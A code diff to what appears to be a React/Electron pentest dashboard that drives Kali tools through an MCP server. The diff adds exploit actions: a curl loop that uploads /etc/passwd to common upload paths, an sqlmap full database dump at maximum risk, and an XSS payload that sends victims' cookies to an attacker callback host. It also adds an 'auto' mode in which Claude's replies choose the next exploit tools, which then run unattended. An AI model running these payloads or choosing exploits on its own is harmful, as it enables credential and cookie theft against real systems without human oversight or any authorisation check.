@@ -1020,11 +1020,11 @@ function DashboardView({ logs, findings, targets }) {
 // ─── PENTEST VIEW ───────────────────────────────────────────────────────────────
 
 const TOOL_BINS = {
-  subfinder: 'subfinder', httpx: 'httpx', ghauri: 'ghauri', ffuf: 'ffuf',
-  aquatone: 'aquatone',  burp_suite: 'bash', naabu_scan: 'nmap',
-  katana_crawl: 'curl',  nuclei_fast: 'nuclei',   sqli_scan: 'sqlmap',
-  xss_check: 'nuclei',   cors_check: 'nuclei',    js_analyze: 'whatweb',
-  dir_fuzz: 'gobuster',  ssrf_check: 'nuclei',    lfi_test: 'nuclei',
+  subfinder: 'subfinder', httpx: 'httpx',    ghauri: 'ghauri',    ffuf: 'ffuf',
+  aquatone: 'aquatone',  burp_suite: 'bash', naabu_scan: 'nmap',  katana_crawl: 'curl',
+  nuclei_fast: 'nuclei', sqli_scan: 'sqlmap',xss_check: 'nuclei', cors_check: 'nuclei',
+  js_analyze: 'whatweb', dir_fuzz: 'gobuster',ssrf_check: 'nuclei',lfi_test: 'nuclei',
+  shell_upload: 'curl',  cred_dump: 'sqlmap', xss_inject: 'curl',
 };
 
 function PentestView({ apiKey, mcpUrl, mcpTools }) {
@@ -1032,26 +1032,19 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
   const [running,    setRunning]    = useState(false);
   const [log,        setLog]        = useState([]);
   const [toolStatus, setToolStatus] = useState({});
-  const [tools,   setTools]   = useState({
-    subfinder:    true,
-    httpx:        true,
-    ghauri:       true,
-    ffuf:         true,
-    aquatone:     false,
-    burp_suite:   false,
-    naabu_scan:   false,
-    katana_crawl: false,
-    nuclei_fast:  true,
-    sqli_scan:    false,
-    xss_check:    false,
-    cors_check:   false,
-    js_analyze:   false,
-    dir_fuzz:     false,
-    ssrf_check:   false,
-    lfi_test:     false,
+  const [tools,      setTools]      = useState({
+    subfinder: true,  httpx: true,   ghauri: true,  ffuf: true,
+    aquatone: false,  burp_suite: false,
+    naabu_scan: false, katana_crawl: false, nuclei_fast: true,
+    sqli_scan: false,  xss_check: false,   cors_check: false,
+    js_analyze: false, dir_fuzz: false,    ssrf_check: false,  lfi_test: false,
+    shell_upload: false, cred_dump: false,  xss_inject: false,
   });
+  const [autoMode,   setAutoMode]   = useState(false);
+  const [xssCallback,setXssCallback]= useState('');
   const PRIMARY   = ['subfinder','httpx','ghauri','ffuf','aquatone','burp_suite'];
   const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test'];
+  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject'];
   const logRef = useRef(null);
 
   useEffect(() => {
@@ -1077,66 +1070,117 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
   }, [mcpUrl]);
 
   const TOOL_MAP = {
-    subfinder:    { tool: 'subfinder',   args: (t) => ({ domain: t, flags: '-silent' }) },
-    httpx:        { tool: 'httpx',       args: (t) => ({ target: t, flags: '-status-code -title -tech-detect' }) },
-    ghauri:       { tool: 'ghauri',      args: (t) => ({ url: t, flags: '--dbs --batch' }) },
-    ffuf:         { tool: 'ffuf',        args: (t) => ({ url: `${t}/FUZZ`, wordlist: '/usr/share/seclists/Discovery/Web-Content/common.txt', flags: '-mc 200,301,302,403' }) },
-    aquatone:     { tool: 'aquatone',    args: (t) => ({ target: t }) },
-    burp_suite:   { tool: 'shell',       args: (_t) => ({ command: 'nohup burpsuite &>/dev/null &' }) },
-    naabu_scan:   { tool: 'nmap',        args: (t) => ({ target: t, flags: '-sV -sC -p- --min-rate 5000' }) },
-    katana_crawl: { tool: 'curl',        args: (t) => ({ url: t, flags: '-L -I' }) },
-    nuclei_fast:  { tool: 'nuclei',      args: (t) => ({ target: t, templates: 'cves,misconfig,exposure', severity: 'critical,high,medium' }) },
-    sqli_scan:    { tool: 'sqlmap',      args: (t) => ({ url: t, flags: '--batch --dbs --level=2' }) },
-    xss_check:    { tool: 'nuclei',      args: (t) => ({ target: t, templates: 'xss', severity: 'high,medium' }) },
-    cors_check:   { tool: 'nuclei',      args: (t) => ({ target: t, templates: 'misconfig', severity: 'high,medium,low' }) },
-    js_analyze:   { tool: 'whatweb',     args: (t) => ({ target: t, flags: '-a 3' }) },
-    dir_fuzz:     { tool: 'gobuster',    args: (t) => ({ target: t }) },
-    ssrf_check:   { tool: 'nuclei',      args: (t) => ({ target: t, templates: 'ssrf', severity: 'critical,high' }) },
-    lfi_test:     { tool: 'nuclei',      args: (t) => ({ target: t, templates: 'lfi', severity: 'critical,high,medium' }) },
+    subfinder:    { tool: 'subfinder', args: (t) => ({ domain: t.replace(/https?:\/\//, ''), flags: '-silent' }) },
+    httpx:        { tool: 'httpx',     args: (t) => ({ target: t, flags: '-status-code -title -tech-detect' }) },
+    ghauri:       { tool: 'ghauri',    args: (t) => ({ url: t, flags: '--dbs --batch' }) },
+    ffuf:         { tool: 'ffuf',      args: (t) => ({ url: `${t}/FUZZ`, wordlist: '/usr/share/seclists/Discovery/Web-Content/common.txt', flags: '-mc 200,301,302,403' }) },
+    aquatone:     { tool: 'aquatone',  args: (t) => ({ target: t }) },
+    burp_suite:   { tool: 'shell',     args: ()  => ({ command: 'nohup burpsuite &>/dev/null &' }) },
+    naabu_scan:   { tool: 'nmap',      args: (t) => ({ target: t.replace(/https?:\/\//, ''), flags: '-sV -sC --top-ports 1000 --min-rate 5000' }) },
+    katana_crawl: { tool: 'curl',      args: (t) => ({ url: t, flags: '-L -I -s' }) },
+    nuclei_fast:  { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'cves,misconfig,exposure', severity: 'critical,high,medium' }) },
+    sqli_scan:    { tool: 'sqlmap',    args: (t) => ({ url: t, flags: '--batch --dbs --level=2 --risk=2' }) },
+    xss_check:    { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'xss', severity: 'high,medium' }) },
+    cors_check:   { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'misconfig', severity: 'high,medium,low' }) },
+    js_analyze:   { tool: 'whatweb',   args: (t) => ({ target: t, flags: '-a 3' }) },
+    dir_fuzz:     { tool: 'gobuster',  args: (t) => ({ target: t }) },
+    ssrf_check:   { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'ssrf', severity: 'critical,high' }) },
+    lfi_test:     { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'lfi', severity: 'critical,high,medium' }) },
+    shell_upload: { tool: 'shell',     args: (t) => ({ command: `for p in /upload /admin/upload /wp-content/uploads /files /images /uploads; do r=$(curl -s -o /dev/null -w '%{http_code}' -X POST "${t}$p" -F 'file=@/etc/passwd' 2>/dev/null); [ "$r" = "200" ] || [ "$r" = "201" ] && echo "UPLOAD_OK:${t}$p [$r]"; done` }) },
+    cred_dump:    { tool: 'sqlmap',    args: (t) => ({ url: t, flags: '--batch --dump-all --level=3 --risk=3 --threads=5' }) },
+    xss_inject:   { tool: 'shell',     args: (t, cb) => ({ command: `curl -s -G "${t}" --data-urlencode "q=<script>fetch('${cb||'http://CALLBACK'}?c='+btoa(document.cookie))</script>" -A 'Mozilla/5.0' -o /dev/null -w '%{http_code}'` }) },
+  };
+
+  const runToolParallel = async (selected, tgt) => {
+    const results = [];
+    await Promise.all(selected.map(async (toolKey) => {
+      const map = TOOL_MAP[toolKey];
+      if (!map) return;
+      setLog(prev => [...prev, { t: 'run', m: `⚡ ${toolKey}...` }]);
+      try {
+        const args = toolKey === 'xss_inject' ? map.args(tgt, xssCallback) : map.args(tgt);
+        const r  = await fetch(`${mcpUrl}/call/${map.tool}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(args) });
+        const rd = await r.json();
+        const out = (rd.output || rd.error || '(sem output)').slice(0, 2000);
+        results.push({ key: toolKey, out });
+        setLog(prev => [...prev, { t: 'ok', m: `✓ ${toolKey}` }]);
+      } catch (e) {
+        setLog(prev => [...prev, { t: 'err', m: `✗ ${toolKey}: ${e.message}` }]);
+      }
+    }));
+    return results;
   };
 
   const runPentest = async () => {
-    if (!apiKey) { setLog([{ t: 'err', m: 'API Key Anthropic não configurada nas Settings.' }]); return; }
-    if (!mcpUrl)  { setLog([{ t: 'err', m: 'Kali MCP Server não configurado nas Settings.' }]); return; }
+    if (!apiKey) { setLog([{ t: 'err', m: 'API Key Anthropic não configurada.' }]); return; }
+    if (!mcpUrl)  { setLog([{ t: 'err', m: 'Kali MCP Server não configurado.' }]); return; }
     setRunning(true);
-    setLog([{ t: 'info', m: `▶ Iniciando pentest em ${target}` }]);
+    setLog([{ t: 'info', m: `▶ PENTEST PARALELO — ${target}` }]);
 
     const selected = Object.entries(tools).filter(([,on]) => on).map(([k]) => k);
-    const results  = [];
+    setLog(prev => [...prev, { t: 'info', m: `⚡ ${selected.length} tools em paralelo...` }]);
 
-    for (const toolKey of selected) {
-      const map = TOOL_MAP[toolKey];
-      if (!map) continue;
-      setLog(prev => [...prev, { t: 'run', m: `  → ${toolKey} (${map.tool})...` }]);
+    let allResults = await runToolParallel(selected, target);
+
+    // CVE lookup
+    if (window.electron?.lookupCves) {
+      setLog(prev => [...prev, { t: 'info', m: '🔍 NVD CVE lookup...' }]);
       try {
-        const r   = await fetch(`${mcpUrl}/call/${map.tool}`, {
-          method:  'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body:    JSON.stringify(map.args(target)),
+        const host = target.replace(/https?:\/\//, '').split('/')[0];
+        const cveRes = await window.electron.lookupCves({ query: host });
+        if (cveRes.cves?.length > 0) {
+          const cveOut = cveRes.cves.map(c => `${c.id} [CVSS:${c.cvss}/${c.severity}] ${c.description}`).join('\n');
+          allResults.push({ key: 'cve_lookup', out: cveOut });
+          setLog(prev => [...prev, { t: 'ok', m: `✓ ${cveRes.cves.length} CVEs encontrados` }]);
+        }
+      } catch (_) {}
+    }
+
+    // Claude analysis
+    const buildPrompt = (results) =>
+      `Analisa este pentest ao alvo ${target}.\n\nRESULTADOS:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n`
+      + (autoMode
+        ? `Responde em JSON válido: {"findings":[{"severity":"critical|high|medium|low","title":"...","desc":"...","cve":"..."}],"next_tools":[lista de tools para correr a seguir, de: shell_upload,cred_dump,xss_inject,nuclei_fast,sqli_scan,lfi_test - apenas se existirem vulnerabilidades confirmar exploráveis],"status":"continue|done","report":"markdown"}`
+        : `Cria relatório com: vulnerabilidades, severidade, CVEs relevantes, recomendações.`);
+
+    let round = 0;
+    const maxRounds = autoMode ? 3 : 1;
+
+    while (round < maxRounds) {
+      round++;
+      setLog(prev => [...prev, { t: 'info', m: autoMode ? `🤖 Modo Autónomo — Round ${round}/${maxRounds}` : '🤖 Claude a analisar...' }]);
+      try {
+        const res = await window.electron.callClaude({
+          messages: [{ role: 'user', content: buildPrompt(allResults) }],
+          apiKey,
         });
-        const rd  = await r.json();
-        const out = (rd.output || rd.error || '').slice(0, 2000);
-        results.push(`## ${toolKey} (${map.tool})\n${out}`);
-        setLog(prev => [...prev, { t: 'ok', m: `  ✓ ${toolKey} concluído` }]);
+        const txt = res.content?.find(b => b.type === 'text')?.text || '';
+        if (!txt) { setLog(prev => [...prev, { t: 'err', m: 'Sem resposta do Claude.' }]); break; }
+
+        if (autoMode) {
+          try {
+            const jsonMatch = txt.match(/\{[\s\S]*\}/);
+            const parsed = JSON.parse(jsonMatch?.[0] || '{}');
+            setLog(prev => [...prev, { t: 'report', m: parsed.report || txt }]);
+            if (parsed.status === 'done' || !parsed.next_tools?.length) break;
+            setLog(prev => [...prev, { t: 'info', m: `🔄 Auto: correndo ${parsed.next_tools.join(', ')}...` }]);
+            const extraResults = await runToolParallel(parsed.next_tools.filter(k => TOOL_MAP[k]), target);
+            allResults = [...allResults, ...extraResults];
+          } catch (_) {
+            setLog(prev => [...prev, { t: 'report', m: txt }]);
+            break;
+          }
+        } else {
+          setLog(prev => [...prev, { t: 'report', m: txt }]);
+          break;
+        }
       } catch (e) {
-        setLog(prev => [...prev, { t: 'err', m: `  ✗ ${toolKey}: ${e.message}` }]);
+        setLog(prev => [...prev, { t: 'err', m: `Claude: ${e.message}` }]);
+        break;
       }
     }
 
-    setLog(prev => [...prev, { t: 'info', m: '  Analisando resultados com Claude...' }]);
-    const prompt = `Analisa os resultados deste pentest ao alvo ${target} e cria um relatório com: vulnerabilidades encontradas, severidade, CVEs relevantes, e recomendações.\n\n${results.join('\n\n')}`;
-    try {
-      const res = await window.electron.callClaude({
-        messages: [{ role: 'user', content: prompt }],
-        apiKey,
-        tools:  mcpTools.length > 0 ? mcpTools : undefined,
-        mcpUrl: mcpTools.length > 0 ? mcpUrl   : undefined,
-      });
-      const txt = res.content?.find(b => b.type === 'text')?.text || 'Sem resposta.';
-      setLog(prev => [...prev, { t: 'report', m: txt }]);
-    } catch (e) {
-      setLog(prev => [...prev, { t: 'err', m: `Claude: ${e.message}` }]);
-    }
+    setLog(prev => [...prev, { t: 'ok', m: '■ Pentest concluído.' }]);
     setRunning(false);
   };
 
@@ -1200,18 +1244,60 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
             ))}
           </div>
         </div>
+
+        <div>
+          <div className="font-mono text-[8px] uppercase tracking-widest mb-1.5" style={{ color: '#f97316', opacity: 0.8 }}>Exploit</div>
+          <div className="grid grid-cols-2 gap-1.5">
+            {EXPLOIT.map(tool => (
+              <button
+                key={tool}
+                onClick={() => toggle(tool)}
+                className="flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-left transition-all"
+                style={{ background: tools[tool] ? 'rgba(249,115,22,0.1)' : 'transparent', border: `1px solid ${tools[tool] ? 'rgba(249,115,22,0.4)' : C.border}` }}
+              >
+                <div className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ background: tools[tool] ? '#f97316' : '#222' }} />
+                <span className="font-mono text-[9px] truncate flex-1" style={{ color: tools[tool] ? '#fb923c' : '#333' }}>{tool.replace(/_/g, ' ')}</span>
+                {toolStatus[tool] === true  && <span style={{ color: '#22c55e', fontSize: 9 }}>✓</span>}
+                {toolStatus[tool] === false && <span style={{ color: '#ef4444', fontSize: 9 }}>✗</span>}
+              </button>
+            ))}
+          </div>
+          {tools.xss_inject && (
+            <input
+              type="text"
+              value={xssCallback}
+              onChange={e => setXssCallback(e.target.value)}
+              placeholder="XSS Callback URL (ex: http://vps:8080)"
+              className="mt-2 w-full rounded-lg px-2.5 py-1.5 font-mono text-[9px] outline-none"
+              style={{ background: C.bg, border: '1px solid rgba(249,115,22,0.3)', color: '#fb923c', caretColor: '#f97316' }}
+            />
+          )}
+        </div>
       </div>
 
-      <button
-        onClick={running ? stop : runPentest}
-        className="w-full py-3 rounded-xl font-mono text-xs font-semibold tracking-widest uppercase transition-all"
-        style={running
-          ? { background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.25)', color: '#ef4444' }
-          : { background: C.redDim, border: `1px solid ${C.redBorder}`, color: C.red }
-        }
-      >
-        {running ? '■  PARAR SCAN' : '▶  INICIAR PENTEST'}
-      </button>
+      <div className="flex gap-2">
+        <button
+          onClick={() => setAutoMode(a => !a)}
+          className="px-3 py-2 rounded-xl font-mono text-[9px] font-semibold uppercase tracking-widest transition-all"
+          style={autoMode
+            ? { background: 'rgba(167,139,250,0.15)', border: '1px solid rgba(167,139,250,0.4)', color: '#a78bfa' }
+            : { background: 'transparent', border: `1px solid ${C.border}`, color: '#444' }
+          }
+          title="Modo autónomo: Claude decide e executa sozinho"
+        >
+          {autoMode ? '🤖 AUTO ON' : '🤖 AUTO'}
+        </button>
+        <button
+          onClick={running ? stop : runPentest}
+          className="flex-1 py-2 rounded-xl font-mono text-xs font-semibold tracking-widest uppercase transition-all"
+          style={running
+            ? { background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.25)', color: '#ef4444' }
+            : { background: C.redDim, border: `1px solid ${C.redBorder}`, color: C.red }
+          }
+        >
+          {running ? '■  PARAR' : `⚡  INICIAR${autoMode ? ' (AUTO)' : ''}`}
+        </button>
+      </div>
 
       {log.length > 0 && (
         <div
